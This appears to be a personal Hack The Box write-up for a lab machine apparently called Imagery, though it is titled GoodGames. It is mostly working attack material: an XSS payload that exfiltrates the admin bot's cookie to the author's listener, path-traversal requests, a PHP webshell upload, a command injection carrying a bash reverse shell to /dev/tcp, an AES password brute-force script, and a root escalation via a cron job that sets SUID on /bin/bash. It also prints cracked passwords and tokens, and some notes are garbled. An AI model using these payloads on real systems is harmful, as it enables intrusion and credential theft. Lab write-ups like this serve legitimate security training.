link: https://app.hackthebox.com/machines/GoodGames?tab=play_machine

ip = 10.129.122.182

> It's got some cross site scripting attacks a little bit of local file inclusion. And you need to capture data packets using bulb suite and poison them

## Port scanning

doesn't appear to be any web interface on http:80 and https:443. Will wait for nmap to complete

ports open:

22 - ssh
8000 - http Python?

that's it

## SSH port

there is an ssh port open but it looks like you need a certificate to login... may need to reverse shell?

## Web Enumeration

email address: support@imagery.com
wappalyzer not shouwing anythning. Looking at javascript, nothing jumps out showing this is a static web app perhaps

running gobuster to get additional routes...

```txt
/images               (Status: 200) [Size: 49]
/login                (Status: 405) [Size: 153]
/register             (Status: 405) [Size: 153]
/logout               (Status: 405) [Size: 153]
```

site appears to be built using Werkzeug/3.1.3 Python/3.12.7
maybe this is a flask application?

login test@test.com p=test

---

### report-a-bug screen has two fields

name and details seem to accept text. running sqlmap doesn't seem to be injectable.

\*\*Earmarking for further investigation...

Supposedly there is an XSS vuln that can give you access to an admin page here...?

there is a admin bot crawling the site with an admin creds. I didn't really know this was a thing in HTB but I guess in the future, can assume this is possibility in the future.

We can use a `<script>` tag becaus this is being blocked but we can use the img src attribute to make a request to our machine. I don't know why but img scr does not trigger cors.

```html
<ImG sRC="x" onErRor="new Image().src='http://1010.14.63:7080/wallpaper.png?c='+document.cookie" />
```

attacker machine we get this:

```bash
┌─[eu-dedivip-1]─[10.10.14.63]─[julien23@htb-b1k4xv4cpx]─[~]
└──╼ [★]$ sudo nc -lvnp 7080
listening on [any] 7080 ...

connect to [10.10.14.63] from (UNKNOWN) [10.129.95.86] 53010
GET /image.png?c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOhMxQ.aJ3yxeyHE9oJo-gQHnAxWLVkvjM HTTP/1.1
Host: 10.10.14.63:7080
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://0.0.0.0:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

the admin cookie is `.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOhMxQ.aJ3yxeyHE9oJo-gQHnAxWLVkvjM `

we can use this by setting `document.cookie` to this value

```js
document.cookie=`.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOhMxQ.aJ3yxeyHE9oJo-gQHnAxWLVkvjM `
```

admin panel is now visible. We didn't need to hijack the index.html on our own machine. 

NOTE: for SPA webpages especially when the source is made available to use, consider doing code review on functions to see how values are being rendered. It should be used as a ref but it is rare that we would need to modify the page directly.

There is a log file that appears that we can inspect.

### website appears to ping /auth_status?\_t=<date> with every click

\_t doesn't valid dates before, in the future aven if the input is a number. Doesn't respond to `%7b%7b3*3%7d%7d`. Maybe can investigate later but without feedback this is inconclusive

`eJyrVkrJLC7ISaz0TFGyUko1MzVKMkpOVdJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSA1DiBCLzk_V6kWAJiHLro.aN-ayQ.NEJjFB36KDewBNajIB5W07WKlsQ` key doesn't appear to be jwt

### image uploader

This is probably the main thing maybe?

I can modify the group for groups than don't exist

**request**

```xml
POST /upload_image HTTP/1.1
Host: 10.129.98.227:8000
Content-Length: 549
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycuNjsY3LeX8QWD8a
Accept: */*
Origin: http://10.129.98.227:8000
Referer: http://10.129.98.227:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJxNjTEKgEAMBP-SWkQbQSstfcUR76IEvJyYWIj4d7VQLGdmYQ8IrMuMex-ggTIMVFV1ARmwdiGyQDPirPSw47jQqknQWCZnpLYprf_F6xx6nzaxrz1SMNL9Ya3lPkU4L3GzK_U.aOTH1A.7SKf2mfm6mGMcio-IG-2dqwR1kM
Connection: keep-alive

------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="title"

{{8*8}}
------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="description"

{{8*8}}
------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="group_name"

{{8*8}} 
------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="file"; filename="A.phphp.png"
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>

------WebKitFormBoundarycuNjsY3LeX8QWD8a--
```

**response**:

```xml
POST /upload_image HTTP/1.1
Host: 10.129.98.227:8000
Content-Length: 549
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycuNjsY3LeX8QWD8a
Accept: */*
Origin: http://10.129.98.227:8000
Referer: http://10.129.98.227:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJxNjTEKgEAMBP-SWkQbQSstfcUR76IEvJyYWIj4d7VQLGdmYQ8IrMuMex-ggTIMVFV1ARmwdiGyQDPirPSw47jQqknQWCZnpLYprf_F6xx6nzaxrz1SMNL9Ya3lPkU4L3GzK_U.aOTH1A.7SKf2mfm6mGMcio-IG-2dqwR1kM
Connection: keep-alive

------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="title"

title
------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="description"

description
------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="group_name"

{{8*8}} <-- believe this is being sanitized
------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="file"; filename="A.phphp.png"
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>

------WebKitFormBoundarycuNjsY3LeX8QWD8a--

```

---

## Admin Panel Access

### Log file

there are two links for user log access. when clicking on the user link I get this

request
```txt
GET /admin/get_system_log?log_identifier=admin%40imagery.htb.log HTTP/1.1
Host: 10.129.95.86:8000
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.95.86:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOhMxQ.aJ3yxeyHE9oJo-gQHnAxWLVkvjM
If-None-Match: "1760055248.564716-1378-2828407261"
If-Modified-Since: Fri, 10 Oct 2025 00:14:08 GMT
Connection: keep-alive
```

response

```txt
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Fri, 10 Oct 2025 05:22:18 GMT
Content-Disposition: attachment; filename="admin@imagery.htb.log"
Content-Type: text/plain; charset=utf-8
Content-Length: 2226
Last-Modified: Fri, 10 Oct 2025 05:22:08 GMT
Cache-Control: no-cache
ETag: "1760073728.6669803-2226-2828407261"
Date: Fri, 10 Oct 2025 05:22:18 GMT
Vary: Cookie
Connection: close

[2025-10-10T05:00:08.941481] Logged in successfully.
[2025-10-10T05:00:08.942656] Logged in successfully.
[2025-10-10T05:01:08.452129] Logged in successfully.
[2025-10-10T05:02:08.894072] Logged in successfully.
[2025-10-10T05:02:08.895398] Logged in successfully.
```

changing the file pointer to `../../../../../../../etc/passwd` we find we have LFI

request
```txt
GET /admin/get_system_log?log_identifier=../../../../../../../etc/passwd HTTP/1.1
Host: 10.129.95.86:8000
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.95.86:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOhMxQ.aJ3yxeyHE9oJo-gQHnAxWLVkvjM
If-None-Match: "1760055248.564716-1378-2828407261"
If-Modified-Since: Fri, 10 Oct 2025 00:14:08 GMT
Connection: keep-alive
```

response
```txt
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Fri, 10 Oct 2025 05:23:00 GMT
Content-Disposition: attachment; filename=passwd
Content-Type: text/plain; charset=utf-8
Content-Length: 1982
Last-Modified: Mon, 22 Sep 2025 19:11:49 GMT
Cache-Control: no-cache
ETag: "1758568309.7066295-1982-370479508"
Date: Fri, 10 Oct 2025 05:23:00 GMT
Vary: Cookie
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
web:x:1001:1001::/home/web:/bin/bash
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
snapd-range-524288-root:x:524288:524288::/nonexistent:/usr/bin/false
snap_daemon:x:584788:584788::/nonexistent:/usr/bin/false
mark:x:1002:1002::/home/mark:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
dhcpcd:x:110:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

reading the passwd we see there are a few users including `mark`, `_laurel` and 

## LFI

### Current Process?

I found a CRON_BYPASS_TOKEN in `/proc/self/environ` probably for the admin crawler bot `CRON_BYPASS_TOKEN=K7Zg9vB$24NmW!q8xR0p/runL!`

Looking at `/proc/self/cmdline` I fond the pythanapp location. `/home/web/web/env/bin/python app.py`

Assuming the project is in `/home/web/web` I do a cat `/home/web/web/app.py` to see the project.
We can do the same for `config.py` and `utils.py` from the import statements in `app.py`

under the `_load_data` funcion in utils and in the config.py file, we see the following

```py
def _load_data():
    if not os.path.exists(DATA_STORE_PATH):
        return {'users': [], 'images': [], 'bug_reports': [], 'image_collections': []}
    with open(DATA_STORE_PATH, 'r') as f:
        data = json.load(f)
    for user in data.get('users', []):
        if 'isTestuser' not in user:
            user['isTestuser'] = False
    return data

DATA_STORE_PATH = 'db.json'
```
cat-ing this we get

```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ],
    "images": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ],
    "bug_reports": []
}
```

not the admin password hash and testuser... it's possible that the password could have been recycled maybe?

hashing function

```py
def _hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()
```

alternatively we can use `hash-identifier` to identify the password

```bash
# Check hash type
hashcat --example-hashes | grep -i md5

# Or use hash-identifier
hash-identifier
# Then paste: 5d9c1d507a3f76af1e5c97a3ad1eaa3
```

we can use john to crack md5

```bash
hashcat -m 0 hashes.txt -u /usr/share/wordlists/rockyou.txt
hashcat -m 0 hashes.txt --show

john hashes.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rocky
jonh hashes.txt --format=raw-md5 --show
```
there is only one solution for testuser

testuser:iambatman

import sys
import pyAesCrypt
import os

BUFFER_SIZE = 64 * 1024

def try_password(encfile, outfile, password):
    if os.path.exists(outfile):
        try:
            os.remove(outfile)
        except OSError:
            pass
    try:
        pyAesCrypt.decryptFile(encfile, outfile, password, BUFFER_SIZE)
        with open(outfile, "rb") as f:
            head = f.read(4)
        if head.startswith(b"PK"):
            return True
        return True
    except Exception:
        if os.path.exists(outfile):
            try:
                os.remove(outfile)
            except OSError:
                pass
        return False

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 pyaes_decrypt.py encrypted_file wordlist_or_dash output_file")
        sys.exit(2)

    encfile = sys.argv[1]
    wordlist = sys.argv[2]
    outfile = sys.argv[3]

    def candidates():
        if wordlist == "-":
            for line in sys.stdin:
                yield line.rstrip("\n\r")
        else:
            with open(wordlist, "r", errors="ignore") as f:
                for line in f:
                    yield line.rstrip("\n\r")

    count = 0
    for pwd in candidates():
        count += 1
        if count % 1000 == 0:
            print(f"[+] tried {count} candidates...", flush=True)
        if pwd == "":
            continue
        if try_password(encfile, outfile, pwd):
            print(f"\n[+] SUCCESS! Password found: {pwd!r}")
            print(f"[+] Output written to: {outfile}")
            return
    print("\n[-] Finished list; no password found.")

if __name__ == "__main__":
    main()
logging in as `testuser@imagery.htb` because I have no idea what I'm doing... we get a normal page. we can login but it doesn't appear like there is anything?

looking again at the code, a lot of features that are "in developement" are open to test user

```py
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
```

we can now try to do something with file upload and triggering imagemagick (imagetrigick?)

```py
    try:
        unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

in crop transformations, `shell=true` is enabled getting RCE

got RCE by uploading image and triggering following request on burp suite

```txt
POST /apply_visual_transform HTTP/1.1
Host: 10.129.242.164:8000
Content-Length: 189
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://10.129.242.164:8000
Referer: http://10.129.242.164:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aOjCGw.izwREOZmmjTQ601z6hR4adRLIMI
Connection: keep-alive

{"imageId":"f24fff97-819a-4cf1-944c-b2c3d758d774","transformType":"crop","params":{"x":0,"y":0,"width":680,        "height": "500; bash -c 'bash -i >& /dev/tcp/10.10.14.63/7080 0>&1' #"}
}
```

I get the admin credentials via the bot code as well:-

```txt
USERNAME = "admin@imagery.htb"
PASSWORD = "strongsandofbeach"
```

not sure why I couldn't crack the password.. may need more investigation...

looking at the /etc/ssh/sshd_config, there is public key auth but password is disabled

```toml
PubkeyAuthentication yes
ChallengeResponseAuthentication no

# ... 

# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication no
#PermitEmptyPasswords no
```

attempting to ssh as mark? I don't have read access to the ssh cert (of course). I am convinced the path forward is to ssh as mark though..

trying to use this password as auth but it doesn't connect? `strongsandofbeach`


### Poison Laurel to gain lateral movement?

### Poison bot script to initiate reverse shell

bot runs as "web" user. Same as the current user. running crontab -l it shows the cron job

```bash
* * * * * python3 /home/web/web/bot/admin.py
```

### Backup file located for web

There is a file in `/var/backup/web_20250806_120723.zip.aes`


using python script to crack aes. Password for aes is: bestfriends

password for mark is: supersmash

doing sudo -l gives me the following:-

```bash
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

you remove the password and reset to default like this

```bash

```

the you add a cron job to set the suid bit on `/bin/bash` this will allow you to exec as root

```bash
charcol> auto add --schedule "* * * * *" --command "chmod u+s /bin/bash" --name "sh mark"
```

we then wait for the cron to execute and execute bash as root:

```bash
sleep 60 && /bin/bash -p
```

> **Note**
>
> the relevant section of the bash man page reads as follows
> ```txt
>               -p      Turn  on  privileged mode.  In this mode, the shell does not
>                      read the $ENV and $BASH_ENV files, shell functions  are  not
>                      inherited from the environment, and the SHELLOPTS, BASHOPTS,
>                      CDPATH,  and GLOBIGNORE variables, if they appear in the en‐
>                      vironment, are ignored.  If the shell is  started  with  the
>                      effective user (group) id not equal to the real user (group)
>                      id,  and  the  -p  option is not supplied, these actions are
>                      taken and the effective user id is set to the real user  id.
>                      If  the -p option is supplied at startup, the effective user
>                      id is not reset.  Turning this option off causes the  effec‐
>                      tive user and group ids to be set to the real user and group
>                      ids.
> ```




root flag = a1df162bcca62f219c8134eab0be186c

user flag = 43f27c4b93ab1ec71b8f22cfcadc16ab
